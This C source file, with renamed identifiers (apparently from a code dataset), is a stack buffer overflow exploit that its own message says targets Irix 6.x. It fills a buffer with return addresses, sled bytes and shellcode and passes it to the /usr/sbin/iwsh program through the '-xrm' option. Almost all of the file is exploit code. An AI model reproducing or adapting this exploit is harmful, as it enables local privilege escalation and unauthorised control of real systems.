
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef int u_long ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int VAR_3 ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_0 (char*) ;
 int * VAR_6 ;
 int FUNC_1 (char*,char*,char*,int *,int ,char**) ;
 int FUNC_2 (int) ;
 int VAR_7 ;
 int * VAR_8 ;
 int FUNC_3 (char*) ;
 int FUNC_4 (char*,...) ;
 int FUNC_5 (char*) ;

int FUNC_6(int VAR_9, char **VAR_10)
{
    char *VAR_11[] = {((void*)0)};
    u_long VAR_12, VAR_13, VAR_14;
    u_long *VAR_15;
    int VAR_16, VAR_17 = FUNC_5((char *)VAR_8)+1;
    u_long (*VAR_18)(void) = (u_long (*)(void))VAR_7;

    VAR_13 = VAR_18();

    if (VAR_13 & 0x80000000) {
        FUNC_4("Recompile with the '-32' option\n");
        FUNC_2(1);
    }

    VAR_15 =(u_long *) VAR_6;
    VAR_12 = VAR_13 + VAR_5;

    if (VAR_9 > 1)
        VAR_12 += FUNC_0(VAR_10[1]) * 4;

    if (VAR_12 + VAR_2 > 0x80000000) {
        FUNC_4("Sorry - this exploit for Irix 6.x only\n");
        FUNC_2(1);
    }

    VAR_14 = (VAR_12 + VAR_4 + (VAR_0-VAR_17)/2) & ~3;

    while ((VAR_14 & 0xff000000) == 0 ||
           (VAR_14 & 0x00ff0000) == 0 ||
           (VAR_14 & 0x0000ff00) == 0 ||
           (VAR_14 & 0x000000ff) == 0)
        VAR_14 += 4;

    for (VAR_16 = 0; VAR_16 < VAR_4/(4*sizeof(u_long)); VAR_16++) {
        *VAR_15++ = VAR_12;
        *VAR_15++ = VAR_12;
        *VAR_15++ = VAR_14;
        *VAR_15++ = VAR_14;
    }

    for (VAR_16 = 0; VAR_16 < (VAR_0 - VAR_17) / sizeof(u_long); VAR_16++)
        *VAR_15++ = VAR_3;

    for (VAR_16 = 0; VAR_16 < VAR_17/sizeof(u_long); VAR_16++)
        *VAR_15++ = VAR_8[VAR_16];

    VAR_14 = (VAR_12 + VAR_2 + VAR_4/2) & ~3;

    for (VAR_16 = 0; VAR_16 < VAR_1 / sizeof(u_long); VAR_16++)
        *VAR_15++ = (VAR_14 >> 8) | (VAR_14 << 24);

    *VAR_15 = 0;

    FUNC_4("stack = 0x%x, targ_addr = 0x%x\n", VAR_13, VAR_12);

    FUNC_1("/usr/sbin/iwsh", "iwsh", "-xrm", &VAR_6[2], 0, VAR_11);
    FUNC_3("execl failed");
}
